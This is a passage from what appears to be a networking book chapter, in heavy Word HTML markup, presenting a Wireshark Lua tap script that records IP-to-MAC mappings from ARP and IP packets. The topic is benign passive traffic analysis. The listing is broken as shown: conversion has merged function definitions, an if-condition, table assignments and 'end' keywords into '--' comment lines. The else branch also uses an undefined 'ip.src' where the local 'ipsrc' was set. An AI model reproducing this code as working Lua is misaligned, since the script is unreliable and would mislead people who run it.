the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ip.src</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >eth.src</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >fields to create a mapping in the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp_cache</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >table. Finally, to display the results, we iterate over the table using pairs, printing the IP address to MAC address mapping. The following is the complete code, with comments throughout:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:7.8000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >arp_cache.lua</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:12.2500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--filter on either arp or IP packets (so all packets with a</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >MAC</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >to IP mapping)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local new_filter = "arp || ip"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- we want the src of the arp packet (remember arp doesn't have</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >an IP header)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local arp_ip = Field.new("arp.src.proto_ipv4") local eth_src = Field.new("eth.src")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ip_src = Field.new("ip.src")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:75.4500pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create an empty table that will become our ip to mac address mapping</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local arp_cache = {}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:17.2500pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- <a name="_bookmark638" ></a>create our function to run that creates the listener local function init_listener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create our listner, filtering on either ARP or IP</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section344" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >packets</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local tap = Listener.new(nil, new_filter)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:181.8000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--called for every packet function tap.packet(pinfo, tvb)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:10.9000pt;margin-left:33.9500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create the local variables holding our</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.9500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >fields local arpip =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp_ip()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:216.8000pt;margin-left:33.9500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ethsrc =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >eth_src() local ipsrc =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ip_src()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:33.9500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- explicity checking to see arpip does not equal nil if tostring(arpip) ~= "nil" then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section345" ><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- if it isn't nil then we pull the ARP source IP</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >and</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:-107.9500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >map it to the MAC address in the Ethernet Source field arp_cache[tostring(arpip)] = tostring(ethsrc)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >else</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- if the ARP source IP field is nil then we get</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- access to the packet source via pinfo which is how we access columns</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:-115.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- and map it to the Ethernet Source field (MAC address) arp_cache[tostring(ip.src)] = tostring(ethsrc)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:230.2500pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of main if block end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:266.2000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of tap.packet() end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- just defining an empty tap.reset function function tap.reset()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:273.4000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of tap.reset() end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- define the draw function to print out our created arp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section346" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >cache.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function tap.draw()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- iterate over the keys/values within our arp_cache</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
